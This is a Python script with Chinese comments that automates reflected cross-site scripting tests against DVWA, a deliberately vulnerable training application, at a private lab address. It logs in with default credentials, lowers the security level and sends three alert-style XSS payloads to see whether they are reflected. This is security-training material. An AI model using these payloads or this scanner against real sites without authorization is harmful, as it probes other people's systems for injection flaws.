import requests
import re


class DvwaXssTester:
    def __init__(self, base_url):
        self.session = requests.Session()
        self.base_url = base_url.rstrip('/')

    def login(self, username='admin', password='password'):
        """登录DVWA"""
        login_url = f"{self.base_url}/login.php"

        # 获取登录页token
        resp = self.session.get(login_url)
        token = self._extract_token(resp.text)

        # 提交登录
        data = {
            'username': username,
            'password': password,
            'Login': 'Login',
            'user_token': token if token else ''
        }
        self.session.post(login_url, data=data)

        # 设置低安全级别
        self.session.cookies.set('security', 'low')
        print("✅ 登录成功，安全级别: low")

    def _extract_token(self, html):
        """从HTML提取CSRF token"""
        match = re.search(r"name='user_token' value='([^']+)'", html)
        return match.group(1) if match else None

    def test_reflected_xss(self, param_name='name'):
        """测试反射型XSS"""
        target_url = f"{self.base_url}/vulnerabilities/xss_r/"

        # 获取页面token
        resp = self.session.get(target_url)
        token = self._extract_token(resp.text)
        if not token:
            print("❌ 未找到token，请检查登录状态")
            return

        # 测试payload
        payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "\" onmouseover=\"alert(1)"
        ]

        for payload in payloads:
            params = {
                param_name: payload,
                'user_token': token  # 必须带token
            }

            response = self.session.get(target_url, params=params)

            # 检查是否反射
            if payload in response.text or "alert(1)" in response.text:
                print(f"✅ 发现漏洞: {payload}")
                print(f"   URL: {response.url}")
            else:
                print(f"❌ 未发现: {payload[:20]}...")

            # 更新token（高安全级别需要）
            new_token = self._extract_token(response.text)
            if new_token and new_token != token:
                token = new_token


if __name__ == "__main__":
    # 使用示例
    tester = DvwaXssTester("http://192.168.101.128/dvwa")
    tester.login()
    tester.test_reflected_xss()